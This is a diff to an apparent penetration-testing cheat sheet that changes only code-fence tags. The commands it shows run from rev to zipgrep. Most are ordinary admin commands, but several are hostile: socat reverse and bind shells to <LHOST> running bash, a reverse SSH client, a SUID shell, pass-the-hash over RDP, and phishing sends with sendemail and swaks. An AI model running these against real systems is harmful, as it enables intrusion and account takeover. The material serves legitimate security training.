@@ -5155,13 +5161,13 @@ C:\> reg.exe save hklm\system c:\temp\system.save
 
 ## rev
 
-```c
+```console
 $ echo "foobar" | rev
 ```
 
 ## Reverse SSH
 
-```c
+```console
 $ git clone https://github.com/NHAS/reverse_ssh
 $ cd reverse_ssh
 $ make
@@ -5170,21 +5176,21 @@ $ cat ~/.ssh/id_rsa.pub > authorized_keys
 $ ./server 0.0.0.0:3232
 ```
 
-```c
+```console
 $ ./client -d <LHOST>:3232
 ```
 
-```c
+```console
 $ ssh <LHOST> -p 3232 ls -t
 ```
 
-```c
+```console
 $ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
 ```
 
 ## rlwrap
 
-```c
+```console
 $ rlwrap nc -lnvp <LPORT>
 ```
 
@@ -5192,13 +5198,13 @@ $ rlwrap nc -lnvp <LPORT>
 
 ### Unpacking .rpm-Files
 
-```c
+```console
 $ rpm2cpio <FILE>.rpm | cpio -idmv
 ```
 
 ## rsh
 
-```c
+```console
 $ rsh <RHOST> <COMMAND>
 $ rsh -l <USERNAME> <RHOST>
 ```
@@ -5207,23 +5213,23 @@ $ rsh -l <USERNAME> <RHOST>
 
 ### Connect
 
-```c
+```console
 $ nc -vn remote_ip 873
 ```
 
-```c
+```console
 $ #list
 ```
 
 ### Download
 
-```c
+```console
 $ rsync -av rsync://<RHOST>/<FILE>/<REMOTE_DIRECTORY> <LOCAL_DIRECTORY>
 ```
 
 ## RunAs
 
-```c
+```console
 C:\> runas /user:"<USERNAME>" cmd.exe
 ```
 
@@ -5231,25 +5237,25 @@ C:\> runas /user:"<USERNAME>" cmd.exe
 
 ### List Sessions
 
-```c
+```console
 $ screen -ls
 ```
 
 ### Attach to Session
 
-```c
+```console
 $ screen -x <NAME>
 ```
 
 ### Window List
 
-```c
+```console
 ctrl + a ctrl + w
 ```
 
 ### Window Handling
 
-```c
+```console
 ctrl + a + c    // new window
 ctrl + a + n    // next window
 ctrl + a +p     // previous window
@@ -5259,19 +5265,19 @@ ctrl + k        // kill current window
 
 ### Session Handling
 
-```c
+```console
 ctrl +a ctrl +a    // screen within screen
 ```
 
 ### Copy Mode
 
-```c
+```console
 ctrl + esc
 ```
 
 ## sendemail
 
-```c
+```console
 $ sendemail -f foobar@<DOMAIN> -t nico@<DOMAIN> -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v
 ```
 
@@ -5279,26 +5285,26 @@ $ sendemail -f foobar@<DOMAIN> -t nico@<DOMAIN> -u "Invoice Attached" -m "You ar
 
 ### Create a List of Numbers
 
-```c
+```console
 $ seq 0 100
 ```
 
 ## SetUID Bit
 
-```c
+```console
 $ chmod 4755 <FILE>
 ```
 
 ## sftp
 
-```c
+```console
 $ ftps -P <RPORT> ftpuser@<RHOST>
 $ sshfs -p <RPORT> ftpuser@<RHOST>: /mnt/<FOLDER>
 ```
 
 ## showmount
 
-```c
+```console
 $ /usr/sbin/showmount -e <RHOST>
 $ sudo showmount -e <RHOST>
 
@@ -5307,14 +5313,14 @@ $ chown root:root sid-shell; chmod +s sid-shell
 
 ## SIGSEGV
 
-```c
+```console
 $ sleep 50 &
 $ killall -SIGSEGV sleep
 ```
 
 ## simpleproxy
 
-```c
+```console
 $ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
 ```
 
@@ -5322,24 +5328,24 @@ $ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
 
 ### Prerequisistes
 
-```c
+```console
 $ sudo apt-get install libguestfs-tools
 ```
 
 ### Common Commands
 
-```c
+```console
 $ mount.cifs //<RHOST>/<SHARE> /mnt/remote
 $ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> -v
 ```
 
 ## smbcacls
 
-```c
+```console
 $ smcbcacls -N "//<RHOST>/<SHARE>" ''
 ```
 
-```c
+```console
 $ for i in $(ls); do echo $i; smbcacls -N "//<RHOST>/<SHARE>" '$i';done >&1 > <FILE>
 ```
 
@@ -5347,7 +5353,7 @@ $ for i in $(ls); do echo $i; smbcacls -N "//<RHOST>/<SHARE>" '$i';done >&1 > <F
 
 ### Common Commands
 
-```c
+```console
 $ smbclient -L \\<RHOST>\ -N
 $ smbclient -L //<RHOST>/ -N
 $ smbclient -L ////<RHOST>/ -N
@@ -5363,21 +5369,21 @@ $ smbclient --no-pass //<RHOST>/<SHARE>
 
 ### Usage
 
-```c
+```console
 $ smb:\> allinfo <FILE>
 $ smb:\> get <filename>
 ```
 
 ### Anonymous Login
 
-```c
+```console
 $ smbclient //<RHOST>/<FOLDER> -N
 $ smbclient \\\\<RHOST>/<FOLDER> -N
 ```
 
 ### Download multiple Files at once
 
-```c
+```console
 $ smbclient '\\<RHOST>\<SHARE>'
 smb: \> mask ""
 smb: \> recurse ON
@@ -5389,7 +5395,7 @@ smb: \> mget *
 
 ### Upload multiple Files at once
 
-```c
+```console
 $ smbclient '\\<RHOST>\<SHARE>'
 smb: \> recurse ON
 smb: \> prompt OFF
@@ -5398,20 +5404,20 @@ smb: \> mput *
 
 ### One-liner
 
-```c
+```console
 $ smbclient '\\<RHOST>\<SHARE>' -N -c 'prompt OFF;recurse ON;cd 'PATH\TO\REMOTE\DIRECTORY';lcd '/PATH/TO/LOCAL/DIRECTORY';mget *'`
 ```
 
 ## smbget
 
-```c
+```console
 $ smbget -R smb://<RHOST>/<folder>
 $ smbget -rR smb://<RHOST>/PATH/TO/SHARE/ -U <USERNAME>
 ```
 
 ## smbmap
 
-```c
+```console
 $ smbmap -H <RHOST>
 $ smbmap -H <RHOST> -R
 $ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
@@ -5419,7 +5425,7 @@ $ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
 
 ## smbpasswd
 
-```c
+```console
 $ smbpasswd -r <RHOST> -U <USERNAME>
 ```
 
@@ -5427,7 +5433,7 @@ $ smbpasswd -r <RHOST> -U <USERNAME>
 
 ### Port Forwarding
 
-```c
+```console
 $ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
 $ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
 ```
@@ -5438,13 +5444,13 @@ $ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
 
 ##### Local System
 
-```c
+```console
 $ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
 ```
 
 ##### Remote System
 
-```c
+```console
 $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
 ```
 
@@ -5452,13 +5458,13 @@ $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
 
 ##### Local System
 
-```c
+```console
 $ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
 ```
 
 ##### Remote System
 
-```c
+```console
 $ socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
 ```
 
@@ -5466,20 +5472,20 @@ $ socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
 
 #### Local System
 
-```c
+```console
 $ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
 ```
 
 ### Bind Shell
 
-```c
+```console
 $ sudo socat OPENSSL-LISTEN:443,cert=<FILE>.pem,verify=0,fork EXEC:/bin/bash
 $ socat - OPENSSL:<RHOST>:443,verify=0
 ```
 
 ### Send File
 
-```c
+```console
 $ sudo socat TCP4-LISTEN:443,fork file:<FILE>
 $ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -out <FILE>.crt; cat <FILE>.key <FILE>.crt \> <FILE>.pem
 ```
@@ -5488,43 +5494,43 @@ $ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 
 
 #### Create Certificate
 
-```c
+```console
 $ openssl req --newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -days 362 -out <FILE>.crt
 ```
 
 #### Create .pem File
 
-```c
+```console
 $ cat <FILE>.key <FILE>.crt > <FILE>.pem
 ```
 
 #### Listener
 
-```c
+```console
 $ socat OPENSSL-LISTEN:<LPORT>,cert=<FILE>.pem,verify=0 -
 ```
 
 or
 
-```c
+```console
 socat OPENSSL-LISTEN:<LPORT> FILE:tty,raw,echo=0,cert=<FILE>.pem,verify=0
 ```
 
 #### Connect
 
-```c
+```console
 $ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
 ```
 
 or
 
-```c
+```console
 $ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ## Spaces Cleanup
 
-```c
+```console
 $ sed -i -e ‘s/\r$//’ <SCRIPT>
 ```
 
@@ -5532,17 +5538,17 @@ The tool `dos2unix` does the job too.
 
 ## squid
 
-```c
+```console
 $ cat /var/spool/squid/netdb.state
 ```
 
 ## squidclient
 
-```c
+```console
 $ sudo apt-get install squidclient
 ```
 
-```c
+```console
 $ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
 ```
 
@@ -5550,43 +5556,43 @@ $ squidclient -h <RHOST> -w '<PASSWORD>' mgr:fqdncache
 
 ### Fixing SSH Private Key
 
-```c
+```console
 $ dos2unix id_rsa
 $ vim --clean id_rsa
 $ chmod 600 id_rsa
 ```
 
-```c
+```console
 $ dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
 ```
 
 ### Enumerate Username from Private Key
 
-```c
+```console
 $ ssh-keygen -y -f <SSH_KEY>
 ```
 
 ### Code Execution
 
-```c
+```console
 $ ssh <USERNAME>@<RHOST> "<COMMAND>"
 ```
 
 ### Force Password Authentication
 
-```c
+```console
 $ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <USERNAME>@<RHOST>
 ```
 
 ### Outdated Ciphers
 
-```c
+```console
 $ ssh <USERNAME>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
 ```
 
 ### Error Message: expecting SSH2_MSG_KEX_ECDH_REPLY
 
-```c
+```console
 $ sudo ifconfig <INTERFACE> mtu 1200
 ```
 
@@ -5594,33 +5600,33 @@ $ sudo ifconfig <INTERFACE> mtu 1200
 
 #### Creating and Signing Keys
 
-```c
+```console
 $ ssh-keygen -f <NAME> -C "<DESCRIPTION>" -N "<PASSWORD>"
 $ ssh-keygen -s <SSH_KEY> -I <IDENTITY> -n <USERNAME> -V +52w <SSH_KEY>.pub
 ```
 
 #### Authentication
 
-```c
+```console
 $ ssh -i <SSH_KEY> -o CertificateFile=<USERNAME>-cert.pub <USERNAME>@<RHOST>
 ```
 
 ### Proxyjump / SSH Inception
 
-```c
+```console
 $ ssh -j <CONFIG_ENTRY> <USER>@<RHOST> cat /tmp/<File> > <FILE>
 ```
 
 ### Port Forward Listener
 
-```c
+```console
 $ ssh -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
 $ ssh -N -L <LPORT>:127.0.0.1:<RPORT> <USERNAME>@<RHOST>
 ```
 
 ### Reverse SSH Tunnel
 
-```c
+```console
 $ ssh -L 80:<LHOST>:80 <RHOST>
 $ ssh -L 80:localhost:80 <RHOST>
 $ ssh -N -L 0.0.0.0:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
@@ -5628,7 +5634,7 @@ $ ssh -N -L 0.0.0.0:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
 
 ### Dynamic Port Forwarding
 
-```c
+```console
 $ ssh -D 1080 <USERNAME>@<RHOST>
 $ ssh -NfD 1080 <USERNAME>@<RHOST>
 $ ssh -N -D 0.0.0.0:9999 <USERNAME>@<RHOST>
@@ -5638,14 +5644,14 @@ Then use Proxychains with `socks5` with port `1080/TCP` or `9999/TCP` on localho
 
 ### Remote Port Forwarding
 
-```c
+```console
 $ ssh -R 8080:<LHOST>:80 <RHOST>
 $ ssh -N -R 127.0.0.1:<LPORT>:<RHOST>:<RPORT> <USERNAME>@<RHOST>
 ```
 
 ### Remote Dynamic Port Forwarding
 
-```c
+```console
 $ ssh -N -R <LHOST> <USERNAME>@<RHOST>
 ```
 
@@ -5653,32 +5659,32 @@ $ ssh -N -R <LHOST> <USERNAME>@<RHOST>
 
 ### Command
 
-```c
+```console
 ~C
 ```
 
 #### Example
 
-```c
+```console
 SSH>
 ```
 
 ## sshpass
 
-```c
+```console
 $ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST>
 $ sshpass -p "<PASSWORD>" ssh <USERNAME>@<RHOST> "<COMMAND>"
 ```
 
 ## stat
 
-```c
+```console
 $ stat <LOCAL_DIRECTORY>
 ```
 
 ### strace
 
-```c
+```console
 $ strace -v -f -e execve /PATH/TO/BINARY 2>&1 | grep <NAME>
 ```
 
@@ -5686,7 +5692,7 @@ $ strace -v -f -e execve /PATH/TO/BINARY 2>&1 | grep <NAME>
 
 ### Set Size for Reverse Shell
 
-```c
+```console
 $ stty -a
 $ stty rows <NUMBER>
 $ stty cols <NUMBER>
@@ -5694,7 +5700,7 @@ $ stty cols <NUMBER>
 
 ### Limit Line Output
 
-```c
+```console
 $ stty rows 2
 ```
 
@@ -5702,13 +5708,13 @@ $ stty rows 2
 
 ### Show clean Output
 
-```c
+```console
 $ strings -n 8 <FILE>
 ```
 
 ## SVN
 
-```c
+```console
 $ svn checkout svn://<RHOST>/
 $ svn diff -r 2
 ```
@@ -5721,14 +5727,14 @@ $ svn diff -r 2
 
 ### Basic Commands
 
-```c
+```console
 $ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: <SUBJECT>" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
 $ swaks --server <RHOST> --port 587 --auth-user "<EMAIL>" --auth-password "<PASSWORD>" --to "<EMAIL>" --from "<EMAIL>" --header "Subject: <SUBJECT>" --body "\\\<LHOST>\"
 ```
 
 ### Automation
 
-```c
+```console
 $ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / Test" --body "goto http://<LHOST>/" --server <RHOST>; done < mail.txt
 ```
 
@@ -5736,26 +5742,26 @@ $ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / 
 
 ### Networking Commands
 
-```c
+```console
 $ ip -c -br address show
 $ ip -c -br address show <INTERFACE>
 ```
 
 ### Service Commands
 
-```c
+```console
 $ systemd-analyze security --no-pager systemd-logind.service
 ```
 
 ## tee
 
-```c
+```console
 $ cat <FILE> | tee output.txt    // displays the output and also writes it down into a file
 ```
 
 ## Telnet
 
-```c
+```console
 GET / HTTP/1.1
 Host: telnet
 Enter
@@ -5763,7 +5769,7 @@ Enter
 
 ## tftp
 
-```c
+```console
 $ tftp <RHOST>
 $ status
 $ get
@@ -5772,13 +5778,13 @@ $ put
 
 ### Working Directory
 
-```c
+```console
 http://<RHOST>/?file=../../../../var/lib/tftpboot/shell.php
 ```
 
 ## timedatectl
 
-```c
+```console
 $ timedatectl status
 $ sudo dpkg-reconfigure tzdata
 ```
@@ -5787,19 +5793,19 @@ $ sudo dpkg-reconfigure tzdata
 
 ### Stop virtualbox-guest-utils to stop syncing Time
 
-```c
+```console
 $ sudo /etc/init.d/virtualbox-guest-utils stop
 ```
 
 ### Stop systemd-timesyncd to sync Time manually
 
-```c
+```console
 $ sudo systemctl stop systemd-timesyncd
 ```
 
 ### Options to set the Date and Time
 
-```c
+```console
 $ sudo net time -c <RHOST>
 $ sudo net time set -S <RHOST>
 $ sudo net time \\<RHOST> /set /y
@@ -5816,32 +5822,32 @@ $ sudo timedatectl set-local-rtc 1
 
 ### Disable automatic Sync
 
-```c
+```console
 $ sudo systemctl disable --now chronyd
 ```
 
 ### Get the Server Time
 
-```c
+```console
 $ sudo nmap -sU -p 123 --script ntp-info <RHOST>
 ```
 
 ### Sync Command
 
-```c
+```console
 $ sudo date -s "$(curl -si http://<RHOST> | grep "Date: "| sed s/"Date: "//g)"
 Sun 02 Jan 2022 01:37:00 PM UTC
 ```
 
 ### Keep in Sync with a Server
 
-```c
+```console
 $ while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```
 
 ### Hash based on md5 and time
 
-```c
+```console
 $ php -a
 Interactive mode enabled
 
@@ -5852,7 +5858,7 @@ php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_ha
 
 ### Options
 
-```c
+```console
 :set mouse on
 :setw -g mode-keys vi
 :set synchronize-panes
@@ -5860,25 +5866,25 @@ php > while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_ha
 
 ### List Sessions
 
-```c
+```console
 $ tmux list-sessions
 ```
 
 ### Attach to Session
 
-```c
+```console
 $ tmux attach-session -t 0
 ```
 
 ### Window List
 
-```c
+```console
 ctrl b + w
 ```
 
 ### Copy and Paste
 
-```c
+```console
 ctrl b + [
 space
 alt w
@@ -5887,7 +5893,7 @@ ctrl b + ]
 
 ### Search
 
-```c
+```console
 ctrl b + [    // enter copy
 ctrl + s      // enter search from copy mode
 ctrl + r      // search reverse direction
@@ -5895,14 +5901,14 @@ ctrl + r      // search reverse direction
 
 ### Logging
 
-```c
+```console
 ctrl b
 shift + P    // start / stop
 ```
 
 #### Save Output
 
-```c
+```console
 ctrl b + :
 capture-pane -S -
 ctrl b + :
@@ -5913,7 +5919,7 @@ save-buffer <FILE>.txt
 
 ##### .tmux.conf
 
-```c
+```console
 set-option -g @log-dir "$HOME/.tmux/logs"
 if-shell "test ! -d $HOME/tmux-session-logs" "run-shell 'mkdir -p $HOME/.tmux/logs'"
 set-hook -g pane-focus-in 'run-shell "tmux pipe-pane -o \"cat >> $HOME/.tmux/logs/pane-#{session_name}_#{window_index}_#{pane_index}.log\""'
@@ -5926,7 +5932,7 @@ Windows systems usually use `128`.
 
 ## utf8cleaner
 
-```c
+```console
 $ pip3 install utf8cleaner
 $ utf8cleaner --input <FILE>
 ```
@@ -5935,7 +5941,7 @@ $ utf8cleaner --input <FILE>
 
 ### Mounting .vdh-Files
 
-```c
+```console
 $ sudo mount -t cifs //<RHOST>/<FOLDER> /mnt/<LOCAL_DIRECTORY>/ -o user=null
 $ sudo apt-get install libguestfs-tools
 $ sudo guestmount --add /PATH/TO/MOUNTPOINT/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/
@@ -5943,7 +5949,7 @@ $ sudo guestmount --add /PATH/TO/MOUNTPOINT/9b9cfbc4-369e-11e9-a17c-806e6f6e6963
 
 ## vim
 
-```c
+```console
 $ :w !sudo tee %   // write to file without opening it
 $ :w <FILE>        // save output into a file
 $ :sh              // put vim into the background and opens a new shell
@@ -5954,7 +5960,7 @@ $ :%!sort -u       // use a command and pipe the output back to vim
 
 Especially in hardened environments where basic commands like `ls`, `dir` etc. not work.
 
-```c
+```console
 :set shell=/bin/sh
 :shell
 ```
@@ -5963,13 +5969,13 @@ Especially in hardened environments where basic commands like `ls`, `dir` etc. n
 
 ### Fix Copy-and-Paste Issue
 
-```c
+```console
 $ sudo pkill VBoxClient && VBoxClient --clipboard
 ```
 
 ### Fix Missing Kernel Driver Error (rc=1908)
 
-```c
+```console
 $ sudo apt-get remove virtualbox-dkms
 $ sudo apt-get remove --purge virtualbox-dkms
 $ sudo apt-get install -y linux-headers-amd64 linux-image-amd64
@@ -5980,7 +5986,7 @@ $ sudo apt-get install -y virtualbox-dkms
 
 ### Linux
 
-```c
+```console
 $ sudo apt-get install virtualenv
 $ virtualenv -p python2.7 venv
 $ . venv/bin/activate
@@ -5988,7 +5994,7 @@ $ . venv/bin/activate
 
 ### Microsoft Windows
 
-```c
+```console
 C:\Windows\System32> python.exe -m pip install virtualenv
 C:\Windows\System32> python.exe -m virtualenv venv
 C:\Windows\System32> venv\Scripts\activate
@@ -5996,7 +6002,7 @@ C:\Windows\System32> venv\Scripts\activate
 
 ## wget
 
-```c
+```console
 $ wget -r --no-parent <RHOST>/<DIRECTORY>              // recursive download of all files and structure
 $ wget -m ftp://anonymous:anonymous@<RHOST>            // ftp download
 $ wget -N -r -l inf <RHOST>/PATH/TO/REPOSITORY/.git    // reverse download of a git repository
@@ -6004,7 +6010,7 @@ $ wget -N -r -l inf <RHOST>/PATH/TO/REPOSITORY/.git    // reverse download of a 
 
 ## while loop
 
-```c
+```console
 while read -r line;
 do
    echo "$line" ;
@@ -6013,7 +6019,7 @@ done < /PATH/TO/FILE/<FILE>
 
 ## Writeable Directories
 
-```c
+```console
 /dev/shm
 /tmp
 ```
@@ -6022,7 +6028,7 @@ done < /PATH/TO/FILE/<FILE>
 
 ### Open Optional Features Window
 
-```c
+```console
 Win+r
 optionalfeatures
 Enter
@@ -6030,13 +6036,13 @@ Enter
 
 ### Select and install Windows Subsystem for Linux
 
-```c
+```console
 Windows Subsystem for Linux
 ```
 
 ### Set WSL Default Version
 
-```c
+```console
 PS C:\> wsl --set-default-version 1
 ```
 
@@ -6046,23 +6052,23 @@ Open Microsoft App Store and get Kali/Ubuntu.
 
 ### Winetricks .Net Setup
 
-```c
+```console
 $ sudo apt-get install -y mono-complete wine winetricks
 ```
 
-```c
+```console
 $ winetricks dotnet48
 ```
 
 ## wsgidav
 
-```c
+```console
 $ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/FOLDER/
 ```
 
 ## X
 
-```c
+```console
 $ xdpyinfo -display :0
 $ xwininfo -root -tree -display :0
 $ XAUTHORITY=/home/<USERNAME>/.Xauthority xdpyinfo -display :0
@@ -6073,7 +6079,7 @@ $ XAUTHORITY=/home/<USERNAME>/.Xauthority xwd -root -screen -silent -display :0 
 
 ### Common Commands
 
-```c
+```console
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
@@ -6081,26 +6087,26 @@ $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
 
 ### Resolution Handling
 
-```c
+```console
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /h:1010 /w:1920 +clipboard
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
 ```
 
 ### Folder Sharing
 
-```c
+```console
 $ xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore /drive:/PATH/TO/FOLDER,shared
 ```
 
 ### Pass-the-Hash
 
-```c
+```console
 $ xfreerdp /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /v:<RHOST> /dynamic-resolution +clipboard
 ```
 
 ### Disable TLS Security Level
 
-```c
+```console
 $ xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 ```
 
@@ -6108,7 +6114,7 @@ $ xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 
 #### Example
 
-```c
+```console
 [16:46:07:882] [87307:87308] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
 ```
 
@@ -6116,7 +6122,7 @@ $ xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
 
 Add `/tls-seclevel:0 /timeout:80000` to the command.
 
-```c
+```console
 FIX: $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /tls-seclevel:0 /timeout:80000 +clipboard
 ```
 
@@ -6124,24 +6130,24 @@ FIX: $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<RHOST> /tls-seclevel:0 /timeout:
 
 ### Extracing Excel Sheets
 
-```c
+```console
 $ unzip <FILE>.xslx
 ```
 
 ### Creating Excel Sheets
 
-```c
+```console
 $ zip -r <FILE>.xls
 ```
 
 ### Creating Password Protected .zip Files
 
-```c
+```console
 $ zip -re <FILE>.zip <FOLDER>/
 ```
 
 ## zipgrep
 
-```c
+```console
 $ zipgrep password <FILE>.jar
 ```
